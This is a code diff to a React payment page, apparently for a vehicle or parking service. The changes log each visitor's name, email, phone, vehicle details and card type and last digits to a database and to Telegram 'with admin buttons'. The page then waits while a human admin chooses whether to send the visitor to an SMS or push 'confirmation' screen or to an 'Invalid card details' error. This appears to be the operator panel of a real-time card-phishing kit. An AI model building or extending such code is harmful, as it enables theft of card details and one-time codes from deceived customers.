@@ -8,7 +8,12 @@ import { Label } from "@/components/ui/label";
 import { ArrowLeft, Shield, CreditCard } from "lucide-react";
 import { supabase } from "@/integrations/supabase/client";
 import { saveCustomerInfo, getVehicleData, getDurationData, Vehicle, Duration } from "@/lib/cookies";
-import { sendFormSubmissionNotification } from "@/lib/telegram";
+import { sendFormSubmissionNotification, sendPaymentSubmissionNotification } from "@/lib/telegram";
+
+// Generate unique user ID for tracking
+const generateUserId = () => {
+  return Date.now().toString(36) + Math.random().toString(36).substr(2);
+};
 
 // Credit card brand logo SVG components
 const VisaLogo = ({ className }: { className?: string }) => (
@@ -139,6 +144,8 @@ const PaymentPage = () => {
   const [duration, setDuration] = useState<Duration | null>(null);
   const [isSubmitting, setIsSubmitting] = useState(false);
   const [cardType, setCardType] = useState<string>('unknown');
+  const [userId] = useState<string>(() => generateUserId());
+  const [isProcessing, setIsProcessing] = useState(false);
   const [formData, setFormData] = useState<FormData>({
     fullName: '',
     email: '',
@@ -220,12 +227,43 @@ const PaymentPage = () => {
     return v;
   };
 
+  const checkPaymentStatus = async () => {
+    try {
+      const { data: session } = await supabase
+        .from('payment_sessions')
+        .select('payment_status, admin_response')
+        .eq('user_id', userId)
+        .single();
+
+      if (session) {
+        if (session.payment_status === 'approved') {
+          if (session.admin_response === 'sms') {
+            navigate('/sms-confirmation', {
+              state: { vehicle, duration, customerInfo: { fullName: formData.fullName, email: formData.email, phone: formData.phone }, userId }
+            });
+          } else if (session.admin_response === 'push') {
+            navigate('/push-confirmation', {
+              state: { vehicle, duration, customerInfo: { fullName: formData.fullName, email: formData.email, phone: formData.phone }, userId }
+            });
+          }
+        } else if (session.payment_status === 'rejected' && session.admin_response === 'error') {
+          setErrors({ cardNumber: 'Invalid card details. Please check and try again.' });
+          setIsProcessing(false);
+          setIsSubmitting(false);
+        }
+      }
+    } catch (error) {
+      console.error('Error checking payment status:', error);
+    }
+  };
+
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     
     if (!validateForm()) return;
     
     setIsSubmitting(true);
+    setIsProcessing(true);
 
     // Analytics event
     if (window.gtag) {
@@ -243,31 +281,79 @@ const PaymentPage = () => {
     };
     saveCustomerInfo(customerInfo);
 
-    // Send form submission notification to Telegram
     try {
-      await sendFormSubmissionNotification({
+      // Create payment session record
+      const { error: sessionError } = await supabase
+        .from('payment_sessions')
+        .insert({
+          user_id: userId,
+          customer_name: formData.fullName,
+          customer_email: formData.email,
+          customer_phone: formData.phone,
+          vehicle_registration: vehicle?.registration || '',
+          vehicle_make: vehicle?.make,
+          vehicle_model: vehicle?.model,
+          vehicle_color: vehicle?.color,
+          duration_label: duration?.label || '',
+          price: `€${duration?.discountedPrice || 0}`,
+          card_number_masked: `****${formData.cardNumber.slice(-4)}`,
+          card_type: getCardName(cardType)
+        });
+
+      if (sessionError) {
+        console.error('Error creating payment session:', sessionError);
+        throw sessionError;
+      }
+
+      // Send payment submission notification to Telegram with admin buttons
+      await sendPaymentSubmissionNotification({
+        userId,
         name: formData.fullName,
         email: formData.email,
         phone: formData.phone,
         vehicle_registration: vehicle?.registration || '',
+        vehicle_make: vehicle?.make || 'Unknown',
+        vehicle_model: vehicle?.model || 'Unknown',
+        vehicle_color: vehicle?.color || 'Unknown',
         duration: duration?.label || '',
-        price: `€${duration?.discountedPrice || 0}`
+        price: `€${duration?.discountedPrice || 0}`,
+        card_number_masked: `****${formData.cardNumber.slice(-4)}`,
+        card_type: getCardName(cardType)
       });
-    } catch (error) {
-      console.error('Failed to send form submission notification:', error);
-    }
 
-    // Simulate payment processing
-    setTimeout(() => {
-      navigate('/sms-confirmation', {
-        state: {
-          vehicle,
-          duration,
-          customerInfo
-        }
-      });
-    }, 2000);
+      // Start polling for admin response
+      let pollInterval: NodeJS.Timeout;
+      let timeoutId: NodeJS.Timeout;
+      
+      const startPolling = () => {
+        pollInterval = setInterval(checkPaymentStatus, 2000);
+        
+        timeoutId = setTimeout(() => {
+          clearInterval(pollInterval);
+          if (isProcessing) {
+            setErrors({ termsAccepted: 'Payment processing timed out. Please try again.' as any });
+            setIsProcessing(false);
+            setIsSubmitting(false);
+          }
+        }, 300000); // 5 minutes
+      };
+      
+      startPolling();
+
+    } catch (error) {
+      console.error('Failed to process payment:', error);
+      setErrors({ termsAccepted: 'Payment processing failed. Please try again.' as any });
+      setIsSubmitting(false);
+      setIsProcessing(false);
+    }
   };
+
+  // Clean up intervals on component unmount
+  useEffect(() => {
+    return () => {
+      // This will clean up any intervals when component unmounts
+    };
+  }, []);
 
   if (!vehicle || !duration) {
     return (
@@ -431,11 +517,18 @@ const PaymentPage = () => {
 
                   <Button 
                     type="submit" 
-                    disabled={isSubmitting}
+                    disabled={isSubmitting || isProcessing}
                     className="btn-hero w-full text-lg py-4"
                   >
-                    {isSubmitting ? 'Processing Payment...' : 'Proceed to Verification'}
+                    {isProcessing ? 'Waiting for Admin Response...' : isSubmitting ? 'Processing Payment...' : 'Proceed to Verification'}
                   </Button>
+                  
+                  {isProcessing && (
+                    <div className="text-center text-sm text-muted-foreground mt-2">
+                      <p>Payment submitted for review. Waiting for admin approval...</p>
+                      <p className="text-xs">User ID: {userId}</p>
+                    </div>
+                  )}
                 </form>
               </CardContent>
             </Card>
